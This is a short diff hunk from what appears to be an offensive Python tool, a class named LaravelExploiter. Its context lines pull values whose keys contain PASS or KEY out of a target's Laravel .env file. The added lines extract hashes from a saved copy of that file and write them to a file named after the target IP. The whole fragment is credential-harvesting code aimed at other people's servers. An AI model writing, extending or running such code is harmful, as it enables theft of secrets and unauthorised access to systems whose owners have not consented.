@@ -26,6 +26,12 @@ class LaravelExploiter:
                         key, val = line.split("=", 1)
                         if "PASS" in key or "KEY" in key:
                             self.passwords.append(val.strip())
+
+                from engines.hash_extractor import extract_from_env_file, write_hashes_file
+                env_hashes = extract_from_env_file(f"{t_dir}/env_backup.txt")
+                if env_hashes:
+                    write_hashes_file(ip, env_hashes)
+
                 return True
         except: pass
         return False
